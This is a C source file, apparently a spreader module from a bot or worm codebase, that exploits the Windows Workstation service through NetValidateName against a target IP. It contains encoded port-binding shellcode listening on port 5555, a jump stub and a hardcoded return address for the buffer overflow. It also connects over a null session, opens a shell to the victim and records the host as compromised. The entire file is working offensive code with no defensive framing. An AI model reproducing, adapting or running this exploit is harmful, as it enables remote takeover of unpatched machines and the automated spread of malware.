#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_WKSSVC

unsigned char jmp[] =
	"\xe9\x6f\xfd\xff\xff"; // jmp -290h to land in the payload

// PEX generated port binding shellcode (5555)
unsigned char wkssvcsc[] =
	"\x66\x81\xec\x04\x07" // sub sp, 704h
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\xeb\x19\x5e\x31\xc9\x81\xe9\xa6\xff\xff\xff\x81\x36\x76\xac\x7c"
	"\x25\x81\xee\xfc\xff\xff\xff\xe2\xf2\xeb\x05\xe8\xe2\xff\xff\xff"
	"\x9e\x94\x7c\x25\x76\xef\x31\x61\x76\x4b\x05\xe3\x0f\x49\x35\xa3"
	"\x3f\x08\xd1\x0b\x9f\x08\x66\x55\xb1\x75\x75\xd0\xdb\x67\x91\xd9"
	"\x4d\x22\x32\x2b\x9a\xd2\xa4\xc7\x05\x01\xa5\x20\xb8\xde\x82\x96"
	"\x60\xfb\x2f\x17\x29\x9f\x4e\x0b\x32\xe0\x30\x25\x77\xf7\x28\xac"
	"\x93\x25\x21\x25\x1c\x9c\x25\x41\xfd\xad\xf7\x65\x7a\x27\x0c\x39"
	"\xdb\x27\x24\x2d\x9d\xa0\xf1\x72\x5a\xfd\x2e\xda\xa6\x25\xbf\x7c"
	"\x9d\xbc\x16\x2d\x28\xad\x92\x4f\x7c\xf5\xf7\x58\x76\x2c\x85\x23"
	"\x02\x48\x2d\x76\x89\x98\xf3\xcd\xe6\xac\x7c\x25\x2f\x25\x78\xab"
	"\x94\x47\x4d\xda\x10\x2d\x90\xb5\x77\xf8\x14\x24\x77\xac\x7c\xda"
	"\x23\x8c\x2b\x72\x21\xfb\x3b\x72\x31\xfb\x83\x70\x6a\x25\xbf\x14"
	"\x89\xfb\x2b\x4d\x74\xac\x69\x96\xff\x4a\x16\x35\x20\xff\x83\x70"
	"\x6e\xfb\x2f\xda\x23\xb8\x2b\x73\x25\x53\x29\x35\xff\x6e\x1a\xa4"
	"\x9a\xf8\x7c\xa8\x4a\x88\x4d\xe5\x1c\xb9\x25\xd6\xdd\x25\xab\xe3"
	"\x32\x88\x6c\x61\x88\xe8\x58\x18\xff\xd0\x58\x6d\xff\xd0\x58\x69"
	"\xff\xd0\x58\x75\xfb\xe8\x58\x35\x22\xfc\x2d\x74\x27\xed\x2d\x6c"
	"\x27\xfd\x83\x50\x76\xfd\x83\x70\x46\x25\x9d\x4d\x89\x53\x83\xda"
	"\x89\x9d\x83\x70\x5a\xfb\x83\x70\x7a\x53\x29\x0d\x25\xf9\x2a\x72"
	"\xfd\xc0\x58\x3d\xfd\xe9\x40\xae\x22\xa9\x04\x24\x9c\x27\x36\x3d"
	"\xfd\xf6\x5c\x24\x9d\x4f\x4e\x6c\xfd\x98\xf7\x24\x98\x9d\x83\xd9"
	"\x47\x6c\xd0\x1d\x96\xd8\x7b\xe4\xb9\xa1\x7d\xe2\x9d\x5e\x47\x59"
	"\x52\xb8\x09\xc4\xfd\xf6\x58\x24\x9d\xca\xf7\x29\x3d\x27\x26\x39"
	"\x77\x47\xf7\x21\xfd\xad\x94\xce\x74\x9d\xbc\xac\x9c\xf3\x22\x78"
	"\x2d\x6e\x74\x25";

typedef int (*MYPROC)(LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, ULONG);

bool wkssvc(EXINFO exinfo) {
	char szBuffer[3300];
	wchar_t wszBuffer[3300*2];
	NETRESOURCEW netResource; 

	HMODULE hMod=LoadLibrary("netapi32.dll");
	MYPROC procAddress = (MYPROC)GetProcAddress(hMod, "NetValidateName");

	int iHostOS;
	if ((iHostOS=FpHost(exinfo.ip, FP_LSASS)) != OS_WINXP) return false;

	while (true) {
		if(!ConnectViaNullSession(exinfo.ip, &netResource)) break;

		memset(szBuffer, 0x90, sizeof(szBuffer));
		memcpy(&szBuffer[1400], wkssvcsc, sizeof(wkssvcsc)-1);
		// ebp @ &szBuffer[2013]
		*(unsigned int *)(&szBuffer[2017]) = 0x74fdee63; // eip (jmp esp @ msafd.dll, Windows 2000 5.0.4.0 SP4)
		memcpy(&szBuffer[2021 + 12], jmp, sizeof(jmp)); // includes terminal NULL char


		for (int x=0, i=0; x<=sizeof(szBuffer); x++, i+=2) wszBuffer[i]=(WCHAR)szBuffer[x];

		char szTemp[8192]; 
		sprintf(szTemp, "\\\\%s", exinfo.ip);
		wchar_t wszTemp[8192];
		MultiByteToWideChar(CP_ACP, 0, szTemp, strlen(szTemp)+1, wszTemp, (int)sizeof(wszTemp)/(int)sizeof(wszTemp[0]));

		int iRet=(procAddress)(wszTemp, (WCHAR*)szBuffer, NULL, NULL, NetSetupUnknown);

		break;
	}

	CloseNullSession(exinfo.ip);

	ConnectShell(exinfo, 5555);

	return (AddEx(exinfo,true));
}
#endif